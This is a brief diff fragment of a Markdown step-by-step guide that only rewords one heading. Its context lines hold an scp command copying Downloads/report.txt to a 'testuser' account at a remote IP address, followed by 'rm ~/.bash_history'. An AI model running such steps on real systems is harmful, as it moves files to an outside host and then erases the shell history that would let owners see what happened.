@@ -67,7 +67,7 @@ The following commonly-available libraries:
 ``` bash
 scp Downloads/report.txt testuser@35.197.38.228:/home/testuser/
 ```
-### Step 4: 
+### Step 4: In terminal type:
 ``` bash
 rm ~/.bash_history
 ```
